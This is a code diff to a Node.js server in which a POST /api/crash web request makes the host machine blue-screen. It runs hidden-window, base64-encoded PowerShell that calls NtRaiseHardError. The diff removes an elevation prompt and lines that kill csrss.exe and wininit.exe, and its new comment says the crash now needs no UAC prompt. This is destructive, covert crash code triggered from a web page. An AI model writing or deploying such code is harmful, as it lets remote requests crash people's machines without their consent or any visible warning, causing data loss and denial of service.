@@ -25,8 +25,7 @@ const MIME = {
 // ---------- host crash (BSOD / kernel panic) ----------
 // The browser cannot bugcheck the machine, so the page calls POST /api/crash
 // and this process (running on the host) raises the panic for whatever OS the
-// host actually is. A privilege prompt may appear: bugchecking needs admin
-// (Windows) or root (Linux/macOS).
+// host actually is.
 
 function psEncoded(script) {
   return Buffer.from(script, "utf16le").toString("base64");
@@ -42,9 +41,10 @@ function runQuiet(command) {
 
 function windowsBugcheck() {
   // NtRaiseHardError with ResponseOption 6 (OptionShutdownSystem) forces an
-  // immediate bugcheck; if that is denied, killing csrss/wininit raises
-  // CRITICAL_PROCESS_DIED instead.
-  const inner = `
+  // immediate bugcheck. RtlAdjustPrivilege is used to enable
+  // SeShutdownPrivilege first, which an interactive user holds by default, so
+  // no elevation / UAC prompt is needed.
+  const script = `
 $ErrorActionPreference = 'SilentlyContinue'
 Add-Type -TypeDefinition @"
 using System;
@@ -61,22 +61,8 @@ public static class NtCrash {
 }
 "@
 [NtCrash]::Panic()
-Start-Sleep -Seconds 2
-taskkill /f /im csrss.exe > $null 2>&1
-taskkill /f /im wininit.exe > $null 2>&1
 `;
-  const innerB64 = psEncoded(inner);
-  // Re-launch elevated when the server is not already an administrator.
-  const outer = `
-$ErrorActionPreference = 'SilentlyContinue'
-$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $admin) {
-  Start-Process -Verb RunAs -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-NonInteractive','-WindowStyle','Hidden','-EncodedCommand','${innerB64}'
-  exit
-}
-powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${innerB64}
-`;
-  runQuiet(`powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${psEncoded(outer)}`);
+  runQuiet(`powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${psEncoded(script)}`);
 }
 
 function linuxPanic() {
